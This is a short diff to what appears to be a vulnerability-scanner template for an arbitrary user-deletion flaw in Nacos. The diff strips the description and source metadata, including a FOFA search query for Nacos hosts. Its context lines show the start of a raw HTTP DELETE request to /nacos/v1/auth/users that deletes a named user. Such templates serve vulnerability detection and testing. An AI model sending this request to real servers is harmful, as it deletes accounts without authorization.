@@ -3,12 +3,8 @@ info:
   name: Nacos 任意用户删除漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sv4xx5a8q0a0q4k9'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sv4xx5a8q0a0q4k9
-    fofa: app="nacos"
 http:
 - raw:
   - 'DELETE /nacos/v1/auth/users?username=dudesite HTTP/1.1
